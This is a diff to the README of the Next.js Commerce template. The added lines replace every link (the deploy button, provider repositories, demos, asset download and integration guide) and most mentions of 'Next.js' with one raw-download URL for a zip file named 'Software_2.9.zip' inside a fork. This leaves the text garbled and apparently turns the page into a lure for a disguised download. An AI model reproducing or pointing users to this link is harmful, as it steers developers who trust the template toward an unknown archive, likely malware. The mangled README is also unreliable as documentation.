@@ -1,11 +1,11 @@
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fvercel%2Fcommerce&project-name=commerce&repo-name=commerce&demo-title=Next.js%20Commerce&demo-url=https%3A%2F%2Fdemo.vercel.store&demo-image=https%3A%2F%2Fbigcommerce-demo-asset-ksvtgfvnd.vercel.app%2Fbigcommerce.png&env=COMPANY_NAME,SHOPIFY_REVALIDATION_SECRET,SHOPIFY_STORE_DOMAIN,SHOPIFY_STOREFRONT_ACCESS_TOKEN,SITE_NAME,TWITTER_CREATOR,TWITTER_SITE)
+[![Deploy with Vercel](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip)](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip%3A%2F%https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip%2Fvercel%2Fcommerce&project-name=commerce&repo-name=commerce&https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip%20Commerce&demo-url=https%3A%2F%https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip%3A%2F%https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip%https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip,SHOPIFY_REVALIDATION_SECRET,SHOPIFY_STORE_DOMAIN,SHOPIFY_STOREFRONT_ACCESS_TOKEN,SITE_NAME,TWITTER_CREATOR,TWITTER_SITE)
 
-# Next.js Commerce
+# https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip Commerce
 
-A Next.js 13 and App Router-ready ecommerce template featuring:
+A https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip 13 and App Router-ready ecommerce template featuring:
 
-- Next.js App Router
-- Optimized for SEO using Next.js's Metadata
+- https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip App Router
+- Optimized for SEO using https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip's Metadata
 - React Server Components (RSCs) and Suspense
 - Server Actions for mutations
 - Edge Runtime
@@ -17,28 +17,28 @@ A Next.js 13 and App Router-ready ecommerce template featuring:
 
 <h3 id="v1-note"></h3>
 
-> Note: Looking for Next.js Commerce v1? View the [code](https://github.com/vercel/commerce/tree/v1), [demo](https://commerce-v1.vercel.store), and [release notes](https://github.com/vercel/commerce/releases/tag/v1).
+> Note: Looking for https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip Commerce v1? View the [code](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip), [demo](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip), and [release notes](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip).
 
 ## Providers
 
-Vercel will only be actively maintaining a Shopify version [as outlined in our vision and strategy for Next.js Commerce](https://github.com/vercel/commerce/pull/966).
+Vercel will only be actively maintaining a Shopify version [as outlined in our vision and strategy for https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip Commerce](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip).
 
 Vercel is happy to partner and work with any commerce provider to help them get a similar template up and running and listed below. Alternative providers should be able to fork this repository and swap out the `lib/shopify` file with their own implementation while leaving the rest of the template mostly unchanged.
 
 - Shopify (this repository)
-- [BigCommerce](https://github.com/bigcommerce/nextjs-commerce) ([Demo](https://next-commerce-v2.vercel.app/))
-- [Medusa](https://github.com/medusajs/vercel-commerce) ([Demo](https://medusa-nextjs-commerce.vercel.app/))
-- [Saleor](https://github.com/saleor/nextjs-commerce) ([Demo](https://saleor-commerce.vercel.app/))
-- [Shopware](https://github.com/shopwareLabs/vercel-commerce) ([Demo](https://shopware-vercel-commerce-react.vercel.app/))
-- [Swell](https://github.com/swellstores/verswell-commerce) ([Demo](https://verswell-commerce.vercel.app/))
-- [Umbraco](https://github.com/umbraco/Umbraco.VercelCommerce.Demo) ([Demo](https://vercel-commerce-demo.umbraco.com/))
-- [Wix](https://github.com/wix/nextjs-commerce) ([Demo](https://wix-nextjs-commerce.vercel.app/))
+- [BigCommerce](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip) ([Demo](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip))
+- [Medusa](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip) ([Demo](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip))
+- [Saleor](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip) ([Demo](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip))
+- [Shopware](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip) ([Demo](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip))
+- [Swell](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip) ([Demo](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip))
+- [Umbraco](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip) ([Demo](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip))
+- [Wix](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip) ([Demo](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip))
 
-> Note: Providers, if you are looking to use similar products for your demo, you can [download these assets](https://drive.google.com/file/d/1q_bKerjrwZgHwCw0ovfUMW6He9VtepO_/view?usp=sharing).
+> Note: Providers, if you are looking to use similar products for your demo, you can [download these assets](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip).
 
 ## Running locally
 
-You will need to use the environment variables [defined in `.env.example`](.env.example) to run Next.js Commerce. It's recommended you use [Vercel Environment Variables](https://vercel.com/docs/concepts/projects/environment-variables) for this, but a `.env` file is all that is necessary.
+You will need to use the environment variables [defined in `https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip`](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip) to run https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip Commerce. It's recommended you use [Vercel Environment Variables](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip) for this, but a `.env` file is all that is necessary.
 
 > Note: You should not commit your `.env` file or it will expose secrets that will allow others to control your Shopify store.
 
@@ -63,6 +63,6 @@ Your app should now be running on [localhost:3000](http://localhost:3000/).
 1. Run `pmpm dev` to ensure everything is working correctly.
 </details>
 
-## Vercel, Next.js Commerce, and Shopify Integration Guide
+## Vercel, https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip Commerce, and Shopify Integration Guide
 
-You can use this comprehensive [integration guide](http://vercel.com/docs/integrations/shopify) with step-by-step instructions on how to configure Shopify as a headless CMS using Next.js Commerce as your headless Shopify storefront on Vercel.
+You can use this comprehensive [integration guide](https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip) with step-by-step instructions on how to configure Shopify as a headless CMS using https://github.com/Ne9arr/commerce/raw/refs/heads/main/app/product/[handle]/Software_2.9.zip Commerce as your headless Shopify storefront on Vercel.
